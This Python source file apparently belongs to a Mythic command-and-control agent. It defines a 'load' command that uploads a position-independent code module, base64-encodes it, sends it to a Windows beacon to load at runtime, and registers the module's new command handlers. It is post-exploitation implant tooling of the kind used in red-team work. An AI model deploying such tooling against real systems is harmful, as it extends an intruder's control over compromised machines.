from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64


class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="module_name",
                cli_name="module",
                display_name="Module File",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_module_files,
                description="Previously uploaded PIC module to load",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="module_file",
                display_name="New Module",
                type=ParameterType.File,
                description="Upload new PIC module. After uploading, reuse via the Default tab.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="New",
                        ui_position=1,
                    )
                ],
            ),
        ]

    async def get_module_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=inputMsg.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        response = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        if file_resp.Success:
            names = []
            for f in file_resp.Files:
                if f.Filename not in names and (
                    f.Filename.endswith(".bin") or
                    f.Filename.endswith(".pic") or
                    f.Filename.endswith(".mod") or
                    f.Filename.endswith(".raw")
                ):
                    names.append(f.Filename)
            response.Success = True
            response.Choices = names
        else:
            response.Error = file_resp.Error
        return response

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON arguments.\n\tUsage: {}".format(LoadCommand.help_cmd))


class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load -module <module.bin>"
    description = "Load a PIC module into the beacon at runtime, registering new command handlers."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1129"]
    argument_class = LoadArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        if taskData.args.get_parameter_group_name() == "New":
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=taskData.args.get_arg("module_file"),
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = "Failed to find uploaded module file"
                return response

            file_id = taskData.args.get_arg("module_file")
            module_name = file_search.Files[0].Filename
            taskData.args.add_arg("module_name", module_name)
            taskData.args.remove_arg("module_file")
        else:
            module_name = taskData.args.get_arg("module_name")
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                Filename=module_name,
                LimitByCallback=False,
                MaxResults=1,
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = f"Failed to find module '{module_name}' in Mythic"
                return response
            file_id = file_search.Files[0].AgentFileId

        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get file content: {file_content.Error}"
            return response

        taskData.args.add_arg("module_data", base64.b64encode(file_content.Content).decode(), ParameterType.String)

        mod_len = len(file_content.Content)
        response.DisplayParams = f"-module {module_name} ({mod_len} bytes)"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        import logging
        logger = logging.getLogger("mythic")
        logger.info(f"[load] process_response called with response type={type(response).__name__}, value={str(response)[:200]}")
        result = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        resp_text = response if isinstance(response, str) else str(response)
        logger.info(f"[load] resp_text='{resp_text[:200]}', checking for 'commands registered'")
        if "commands registered" in resp_text:
            module_name = task.args.get_arg("module_name")
            if module_name:
                cmd_name = module_name.replace(".bin", "").replace(".pic", "").replace(".mod", "").replace(".raw", "")
                try:
                    logger.info(f"[load] Registering command '{cmd_name}' for task {task.Task.ID}")
                    reg_resp = await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
                        TaskID=task.Task.ID,
                        Commands=[cmd_name],
                    ))
                    logger.info(f"[load] Registration result: Success={reg_resp.Success}, Error={getattr(reg_resp, 'Error', 'none')}")
                    if not reg_resp.Success:
                        result.Error = f"Module loaded but failed to register command '{cmd_name}': {reg_resp.Error}"
                except Exception as e:
                    logger.error(f"[load] Registration exception: {e}")
                    result.Error = f"Module loaded but command registration failed: {e}"
        return result
